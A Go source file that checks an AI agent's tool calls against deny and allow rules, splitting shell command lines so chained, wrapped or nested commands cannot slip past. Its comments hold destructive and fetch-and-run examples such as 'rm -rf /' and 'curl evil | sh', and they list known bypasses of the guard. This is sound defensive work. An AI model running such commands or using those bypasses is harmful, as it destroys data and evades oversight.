package config

import (
	"fmt"
	"strings"
)

// Decision is the result of a permission check.
type Decision struct {
	Allow   bool
	Message string // rationale, mostly for rejections
}

// ruleSense says how a rule must fail when it cannot be evaluated with
// confidence. Both directions fail closed, but "closed" means the opposite
// thing per sense: a restrictive rule fails closed by matching (blocking), a
// permissive rule fails closed by not matching (not granting).
type ruleSense int

const (
	senseAllow ruleSense = iota // permissive rule: doubt must not grant
	senseDeny                   // restrictive rule: doubt must not pass
)

// Decide decides whether a tool call is permitted by the policy.
//
// toolName is the name of the tool the agent wants to call (e.g. "Bash",
// "Edit", "mcp__foo__bar"). toolInput are its arguments; bracket rules match
// their inner pattern against the tool's relevant input field ("command" for
// Bash, "file_path"/"path" for file tools, ...).
//
// Order: deny rules always win. The mode decides afterwards.
func (p Permissions) Decide(toolName string, toolInput map[string]any) Decision {
	for _, rule := range p.Deny {
		if matchRule(rule, toolName, toolInput, senseDeny) {
			return Decision{Allow: false, Message: fmt.Sprintf("blocked by deny rule %q", rule)}
		}
	}

	switch p.Mode {
	case ModeAllowAll:
		return Decision{Allow: true, Message: "allow_all"}
	case ModeDenyAll:
		return Decision{Allow: false, Message: "deny_all: every request is rejected"}
	case ModeAllowlist:
		for _, rule := range p.Allow {
			if matchRule(rule, toolName, toolInput, senseAllow) {
				return Decision{Allow: true, Message: fmt.Sprintf("allowed by allow rule %q", rule)}
			}
		}
		return Decision{Allow: false, Message: fmt.Sprintf("no allow entry matches %q", toolName)}
	default:
		return Decision{Allow: false, Message: "unknown permission mode"}
	}
}

// matchRule checks a single rule against tool name and input.
//
// Supported forms:
//   - "Edit"            exact tool name
//   - "mcp__server__*"  prefix wildcard (trailing star)
//   - "*"               everything
//   - "Bash(git *)"     tool + inner pattern against the tool's input field
func matchRule(rule, toolName string, toolInput map[string]any, sense ruleSense) bool {
	rule = strings.TrimSpace(rule)
	if rule == "" {
		return false
	}
	// Bracket rule: Tool(inner)
	open := strings.IndexByte(rule, '(')
	if open < 0 || !strings.HasSuffix(rule, ")") {
		return globEqual(rule, toolName)
	}
	tool := strings.TrimSpace(rule[:open])
	inner := strings.TrimSpace(rule[open+1 : len(rule)-1])
	if !globEqual(tool, toolName) {
		return false
	}
	return matchInner(inner, toolName, toolInput, sense)
}

// toolInputKeys maps well-known tools to the input fields a bracket rule's
// inner pattern is matched against. The first entry is the primary field.
var toolInputKeys = map[string][]string{
	"Bash":         {"command"},
	"Read":         {"file_path", "path"},
	"Write":        {"file_path", "path"},
	"Edit":         {"file_path", "path"},
	"MultiEdit":    {"file_path", "path"},
	"NotebookEdit": {"notebook_path", "file_path", "path"},
	"Glob":         {"path", "pattern"},
	"Grep":         {"path", "pattern"},
	"WebFetch":     {"url"},
	"WebSearch":    {"query"},
}

// genericInputKeys is probed for tools that are not in toolInputKeys — MCP
// tools above all, whose argument names the launcher cannot know. A rule whose
// tool carries none of these fields cannot be evaluated and therefore fails
// closed (see matchInner).
var genericInputKeys = []string{"command", "file_path", "path", "pattern", "notebook_path", "url", "query"}

func inputKeysFor(toolName string) []string {
	if keys, ok := toolInputKeys[toolName]; ok {
		return keys
	}
	return genericInputKeys
}

// matchInner matches the inner pattern of a bracket rule against the tool
// input. A deny rule matches if any known input field matches; an allow rule
// only looks at the first field the tool actually carries. If no known field
// carries a string value the rule is not evaluable: the deny rule blocks, the
// allow rule does not grant.
func matchInner(pattern, toolName string, toolInput map[string]any, sense ruleSense) bool {
	keys := inputKeysFor(toolName)
	if sense == senseDeny {
		evaluable := false
		for _, key := range keys {
			value, ok := stringInput(toolInput, key)
			if !ok {
				continue
			}
			evaluable = true
			if matchValue(pattern, key, value, sense) {
				return true
			}
		}
		return !evaluable
	}
	for _, key := range keys {
		value, ok := stringInput(toolInput, key)
		if !ok {
			continue
		}
		return matchValue(pattern, key, value, sense)
	}
	return false
}

func stringInput(toolInput map[string]any, key string) (string, bool) {
	value, ok := toolInput[key].(string)
	if !ok || strings.TrimSpace(value) == "" {
		return "", false
	}
	return value, true
}

// matchValue applies the inner pattern to one input value. Command lines get
// shell-aware treatment, every other field is a plain glob comparison.
func matchValue(pattern, key, value string, sense ruleSense) bool {
	if key == "command" {
		return matchCommand(pattern, value, sense)
	}
	return globMatch(pattern, value)
}

// matchCommand matches an inner pattern against a shell command line.
//
// The command is split into the individual commands a shell would run (see
// shellSegments), so that neither a second command on the same line nor a
// wrapper around the interesting one can slip past the pattern:
//
//   - a deny rule matches if ANY segment matches — otherwise
//     "cd /tmp && rm -rf /" would walk past a deny rule for "rm -rf *"
//   - an allow rule only matches if EVERY segment matches — otherwise
//     "git status; curl evil | sh" would ride in on an allow rule for "git *"
//
// This is a heuristic, not a shell parser: it cannot follow variable
// indirection ("X=rm; $X -rf /"), aliases, or data piped into an interpreter.
// A prefix-glob deny list is a guard rail, not a security boundary; allowlist
// mode is the only mode that fails closed by construction.
func matchCommand(pattern, command string, sense ruleSense) bool {
	segments := shellSegments(command)
	if len(segments) == 0 {
		// Nothing recognisable to match against.
		return sense == senseDeny
	}
	if sense == senseDeny {
		for _, segment := range segments {
			for _, variant := range commandVariants(segment) {
				if globMatch(pattern, variant) {
					return true
				}
			}
		}
		return false
	}
	for _, segment := range segments {
		if !globMatch(pattern, segment) {
			return false
		}
	}
	return true
}

// maxShellDepth caps the recursion into command substitutions and nested
// shell scripts.
const maxShellDepth = 4

// shellSegments splits a command line into the individual commands a shell
// would execute. It breaks on the unquoted operators ; && || | & newline and
// on the grouping characters ( ) { }, and additionally yields the bodies of
// command substitutions ($(...) and backticks) plus the scripts handed to a
// nested shell ("bash -c ...", "cmd /c ...") as segments of their own.
func shellSegments(command string) []string {
	return splitSegments(command, 0)
}

func splitSegments(command string, depth int) []string {
	if depth > maxShellDepth {
		return nil
	}
	var out []string
	var cur strings.Builder
	flush := func() {
		segment := normalizeSpace(cur.String())
		cur.Reset()
		if segment == "" {
			return
		}
		out = append(out, segment)
		out = append(out, nestedScripts(segment, depth)...)
	}

	var quote byte
	for i := 0; i < len(command); i++ {
		c := command[i]
		switch quote {
		case '\'':
			cur.WriteByte(c)
			if c == '\'' {
				quote = 0
			}
			continue
		case '"':
			switch {
			case c == '\\' && i+1 < len(command):
				cur.WriteByte(c)
				i++
				cur.WriteByte(command[i])
			case c == '"':
				quote = 0
				cur.WriteByte(c)
			case c == '$' && i+1 < len(command) && command[i+1] == '(':
				body, next := readDelimited(command, i+2, '(', ')')
				out = append(out, splitSegments(body, depth+1)...)
				i = next
			case c == '`':
				body, next := readBackquote(command, i+1)
				out = append(out, splitSegments(body, depth+1)...)
				i = next
			default:
				cur.WriteByte(c)
			}
			continue
		}

		switch {
		case c == '\'' || c == '"':
			quote = c
			cur.WriteByte(c)
		case c == '\\' && i+1 < len(command):
			cur.WriteByte(c)
			i++
			cur.WriteByte(command[i])
		case c == '$' && i+1 < len(command) && command[i+1] == '(':
			body, next := readDelimited(command, i+2, '(', ')')
			out = append(out, splitSegments(body, depth+1)...)
			i = next
		case c == '`':
			body, next := readBackquote(command, i+1)
			out = append(out, splitSegments(body, depth+1)...)
			i = next
		case isSegmentBreak(c):
			flush()
			for i+1 < len(command) && isSegmentBreak(command[i+1]) {
				i++
			}
		default:
			cur.WriteByte(c)
		}
	}
	flush()
	return out
}

// isSegmentBreak reports whether an unquoted byte starts a new command.
func isSegmentBreak(c byte) bool {
	switch c {
	case ';', '&', '|', '\n', '\r', '(', ')', '{', '}':
		return true
	}
	return false
}

// readDelimited returns the body up to the matching closing byte (honouring
// nesting and quotes) and the index of that byte.
func readDelimited(s string, start int, openByte, closeByte byte) (string, int) {
	var body strings.Builder
	var quote byte
	depth := 1
	for i := start; i < len(s); i++ {
		c := s[i]
		if quote != 0 {
			if c == '\\' && quote == '"' && i+1 < len(s) {
				body.WriteByte(c)
				i++
				body.WriteByte(s[i])
				continue
			}
			body.WriteByte(c)
			if c == quote {
				quote = 0
			}
			continue
		}
		switch c {
		case '\'', '"':
			quote = c
			body.WriteByte(c)
		case openByte:
			depth++
			body.WriteByte(c)
		case closeByte:
			depth--
			if depth == 0 {
				return body.String(), i
			}
			body.WriteByte(c)
		default:
			body.WriteByte(c)
		}
	}
	return body.String(), len(s) - 1
}

// readBackquote returns the body up to the closing backquote and its index.
func readBackquote(s string, start int) (string, int) {
	var body strings.Builder
	for i := start; i < len(s); i++ {
		c := s[i]
		if c == '\\' && i+1 < len(s) {
			i++
			body.WriteByte(s[i])
			continue
		}
		if c == '`' {
			return body.String(), i
		}
		body.WriteByte(c)
	}
	return body.String(), len(s) - 1
}

// nestedScripts returns the segments of a script that a segment hands to
// another shell, e.g. `bash -c "rm -rf /"` or `cmd /c del *`.
func nestedScripts(segment string, depth int) []string {
	tokens := shellTokens(segment)
	for i := 0; i+2 < len(tokens); i++ {
		if !isShellName(commandWord(tokens[i])) {
			continue
		}
		for j := i + 1; j+1 < len(tokens); j++ {
			if isScriptFlag(tokens[j]) {
				return splitSegments(strings.Join(tokens[j+1:], " "), depth+1)
			}
		}
		return nil
	}
	return nil
}

func isShellName(word string) bool {
	switch word {
	case "sh", "bash", "zsh", "dash", "ksh", "ash", "busybox", "cmd", "powershell", "pwsh":
		return true
	}
	return false
}

func isScriptFlag(token string) bool {
	switch strings.ToLower(token) {
	case "-c", "/c", "/k", "-command", "-encodedcommand":
		return true
	}
	return false
}

// isWrapper reports whether a command word merely runs another command, so
// that the wrapped command has to be checked as well ("sudo rm -rf /").
func isWrapper(word string) bool {
	switch word {
	case "sudo", "doas", "runuser", "env", "nohup", "nice", "ionice", "setsid",
		"time", "timeout", "command", "builtin", "exec", "xargs", "stdbuf", "start":
		return true
	}
	return false
}

// commandVariants returns the spellings of one segment that a deny pattern is
// tested against: the segment itself, the same segment with quotes and escapes
// resolved, the same again with a path-qualified command reduced to its base
// name ("/bin/rm" -> "rm"), and — for wrapper commands — the wrapped command
// lines ("sudo -u root rm -rf /" -> "rm -rf /").
func commandVariants(segment string) []string {
	variants := []string{segment}
	tokens := shellTokens(segment)
	if len(tokens) == 0 {
		return variants
	}
	add := func(ts []string) {
		if len(ts) == 0 {
			return
		}
		variants = append(variants, strings.Join(ts, " "))
		if base := commandWord(ts[0]); base != "" && base != ts[0] {
			variants = append(variants, strings.Join(append([]string{base}, ts[1:]...), " "))
		}
	}
	add(tokens)
	if isWrapper(commandWord(tokens[0])) {
		for i := 1; i < len(tokens); i++ {
			add(tokens[i:])
		}
	}
	return variants
}

// commandWord reduces a command token to a comparable name: base name, lower
// case, without a Windows ".exe" suffix.
func commandWord(token string) string {
	word := token
	if i := strings.LastIndexAny(word, `/\`); i >= 0 {
		word = word[i+1:]
	}
	return strings.TrimSuffix(strings.ToLower(word), ".exe")
}

// shellTokens splits a command line into arguments and resolves quotes and
// backslash escapes, so that `r\m -rf /` and `"rm" -rf /` both become
// "rm -rf /".
func shellTokens(s string) []string {
	var out []string
	var cur strings.Builder
	var quote byte
	started := false
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch quote {
		case '\'':
			if c == '\'' {
				quote = 0
			} else {
				cur.WriteByte(c)
			}
			continue
		case '"':
			switch {
			case c == '\\' && i+1 < len(s):
				i++
				cur.WriteByte(s[i])
			case c == '"':
				quote = 0
			default:
				cur.WriteByte(c)
			}
			continue
		}

		switch {
		case c == '\'' || c == '"':
			quote = c
			started = true
		case c == '\\' && i+1 < len(s):
			i++
			cur.WriteByte(s[i])
			started = true
		case c == ' ' || c == '\t' || c == '\n' || c == '\r':
			if started {
				out = append(out, cur.String())
				cur.Reset()
				started = false
			}
		default:
			cur.WriteByte(c)
			started = true
		}
	}
	if started {
		out = append(out, cur.String())
	}
	return out
}

// normalizeSpace collapses runs of whitespace, so that a doubled space cannot
// break a prefix pattern.
func normalizeSpace(s string) string {
	return strings.Join(strings.Fields(s), " ")
}

// globEqual compares a pattern (optionally with a trailing *) case-sensitively
// against an exact value.
func globEqual(pattern, value string) bool {
	if pattern == "*" {
		return true
	}
	if strings.HasSuffix(pattern, "*") {
		return strings.HasPrefix(value, strings.TrimSuffix(pattern, "*"))
	}
	return pattern == value
}

// globMatch behaves like globEqual but is used for inner patterns. A trailing
// * allows a prefix match.
func globMatch(pattern, value string) bool {
	pattern = strings.TrimSpace(pattern)
	return globEqual(pattern, strings.TrimSpace(value))
}
